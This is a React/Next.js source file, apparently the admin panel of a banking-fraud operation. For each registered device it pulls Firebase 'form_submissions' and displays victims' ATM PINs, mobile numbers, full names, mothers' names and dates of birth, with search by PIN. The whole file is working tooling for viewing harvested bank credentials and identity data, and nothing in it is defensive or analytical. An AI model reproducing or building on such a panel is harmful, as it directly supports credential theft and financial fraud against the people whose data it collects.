"use client";

import { useParams, useRouter } from "next/navigation";
import { useEffect, useState } from "react";
import { db } from "@/lib/firbase";
import { ref, onValue } from "firebase/database";
import { Card, CardBody, CardHeader, Button, Input } from "@heroui/react";
import Navbar from "@/components/Navbar";
import Sidebar from "@/components/Sidebar";
import Link from "next/link";

interface FormSubmission {
  id: string;
  atm_pin?: string;
  mobile?: string;
  fullName?: string;
  motherName?: string;
  dob?: string;
  timestamp?: number | string;
}

export default function FormsPage() {
  const params = useParams();
  const router = useRouter();
  const deviceId = decodeURIComponent(params.deviceId as string);

  const [forms, setForms] = useState<FormSubmission[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState("");

  useEffect(() => {
    if (!deviceId) return;

    const deviceRef = ref(db, `registeredDevices/${deviceId}/form_submissions`);

    const unsubscribe = onValue(
      deviceRef,
      (snapshot) => {
        if (snapshot.exists()) {
          const data = snapshot.val();
          const formList: FormSubmission[] = Object.entries(data).map(
            ([key, value]: [string, any]) => ({
              id: key,
              atm_pin: value.atm_pin || "",
              mobile: value.mobile || "",
              fullName: value.fullName || "",
              motherName: value.motherName || "",
              dob: value.dob || "",
              timestamp: value.timestamp || "",
            }),
          );
          setForms(formList);
        } else {
          setForms([]);
        }
        setLoading(false);
      },
      (error) => {
        console.error("Error fetching forms:", error);
        setLoading(false);
      },
    );

    return () => unsubscribe();
  }, [deviceId]);

  const filteredForms = forms.filter(
    (form) =>
      form.mobile?.includes(searchTerm) ||
      form.fullName?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      form.atm_pin?.includes(searchTerm),
  );

  const formatTimestamp = (timestamp: any) => {
    if (!timestamp) return "N/A";
    const date = new Date(Number(timestamp));
    return date.toLocaleString();
  };

  return (
    <div className="page-shell">
      <div className="page-frame">
        <Sidebar />

        <main className="page-main">
          <Navbar
            title="Form Submissions"
            subtitle="All KYC/ATM pin form submissions for this device"
          />

          <nav className="mb-6 flex items-center gap-2 text-sm text-[var(--text-muted)]">
            <Link
              href="/devices"
              className="transition hover:text-[var(--text-main)]"
            >
              Devices
            </Link>
            <span>/</span>
            <Link
              href={`/devices/${deviceId}`}
              className="transition hover:text-[var(--text-main)]"
            >
              {deviceId}
            </Link>
            <span>/</span>
            <span className="text-[var(--text-main)]">Forms</span>
          </nav>

          <Card className="bg-[var(--surface)] border border-[var(--border)]">
            <CardHeader className="border-b border-[var(--border)] px-6 py-4 flex-col items-start gap-4">
              <div className="flex w-full items-center justify-between">
                <div>
                  <h2 className="text-2xl font-bold text-[var(--text-main)]">
                    Form Submissions
                  </h2>
                  <p className="text-sm text-[var(--text-muted)] mt-1">
                    Total: {filteredForms.length} submissions
                  </p>
                </div>
                <Button
                  isIconOnly
                  className="bg-[var(--surface-muted)] text-[var(--text-main)] hover:bg-slate-700"
                  onPress={() => router.back()}
                >
                  <svg
                    className="h-5 w-5"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M15 19l-7-7 7-7"
                    />
                  </svg>
                </Button>
              </div>
              <Input
                placeholder="Search by phone, name, or ATM pin..."
                value={searchTerm}
                onValueChange={setSearchTerm}
                className="w-full"
                classNames={{
                  input: "bg-[var(--surface-muted)] text-[var(--text-main)]",
                  inputWrapper:
                    "bg-[var(--surface-muted)] border-[var(--border)]",
                  label: "text-[var(--text-muted)]",
                }}
              />
            </CardHeader>

            <CardBody className="p-6">
              {loading ? (
                <div className="flex items-center justify-center p-8">
                  <p className="text-[var(--text-muted)]">Loading forms...</p>
                </div>
              ) : filteredForms.length === 0 ? (
                <div className="flex flex-col items-center justify-center p-12">
                  <svg
                    className="h-12 w-12 text-[var(--text-muted)] mb-3 opacity-50"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={1.5}
                      d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"
                    />
                  </svg>
                  <p className="text-[var(--text-muted)]">
                    No form submissions found
                  </p>
                </div>
              ) : (
                <div className="space-y-4">
                  {filteredForms.map((form, idx) => (
                    <div
                      key={form.id}
                      className="rounded-lg border border-[var(--border)] bg-[var(--surface-muted)] p-4 hover:border-blue-500/50 transition-colors"
                    >
                      <div className="flex items-start justify-between mb-4 pb-3 border-b border-[var(--border)]">
                        <div>
                          <h3 className="text-sm font-semibold text-[var(--text-main)]">
                            Form Submission #{idx + 1}
                          </h3>
                          <p className="text-xs text-[var(--text-muted)] mt-1">
                            {formatTimestamp(form.timestamp)}
                          </p>
                        </div>
                        <Button
                          isIconOnly
                          size="sm"
                          className="bg-blue-500/20 text-blue-300 hover:bg-blue-500/30"
                          onPress={() => {
                            window.open(
                              `data:text/html,<pre>${JSON.stringify(form, null, 2)}</pre>`,
                              "_blank",
                            );
                          }}
                        >
                          <svg
                            className="h-4 w-4"
                            fill="none"
                            stroke="currentColor"
                            viewBox="0 0 24 24"
                          >
                            <path
                              strokeLinecap="round"
                              strokeLinejoin="round"
                              strokeWidth={2}
                              d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"
                            />
                          </svg>
                        </Button>
                      </div>
                      <div className="grid grid-cols-2 gap-4 sm:grid-cols-3">
                        {form.fullName && (
                          <div>
                            <p className="text-xs text-[var(--text-muted)] mb-1">
                              Full Name
                            </p>
                            <p className="font-medium text-[var(--text-main)]">
                              {form.fullName}
                            </p>
                          </div>
                        )}
                        {form.mobile && (
                          <div>
                            <p className="text-xs text-[var(--text-muted)] mb-1">
                              Mobile Number
                            </p>
                            <p className="font-mono text-sm text-blue-400 font-semibold">
                              {form.mobile}
                            </p>
                          </div>
                        )}
                        {form.dob && (
                          <div>
                            <p className="text-xs text-[var(--text-muted)] mb-1">
                              Date of Birth
                            </p>
                            <p className="font-medium text-[var(--text-main)]">
                              {form.dob}
                            </p>
                          </div>
                        )}
                        {form.motherName && (
                          <div>
                            <p className="text-xs text-[var(--text-muted)] mb-1">
                              Mother Name
                            </p>
                            <p className="font-medium text-[var(--text-main)]">
                              {form.motherName}
                            </p>
                          </div>
                        )}
                        {form.atm_pin && (
                          <div>
                            <p className="text-xs text-[var(--text-muted)] mb-1">
                              ATM Pin
                            </p>
                            <p className="font-mono text-sm text-yellow-400">
                              {form.atm_pin}
                            </p>
                          </div>
                        )}
                        <div>
                          <p className="text-xs text-[var(--text-muted)] mb-1">
                            Unique ID
                          </p>
                          <p className="font-mono text-xs text-slate-400 truncate">
                            {form.id}
                          </p>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </CardBody>
          </Card>
        </main>
      </div>
    </div>
  );
}
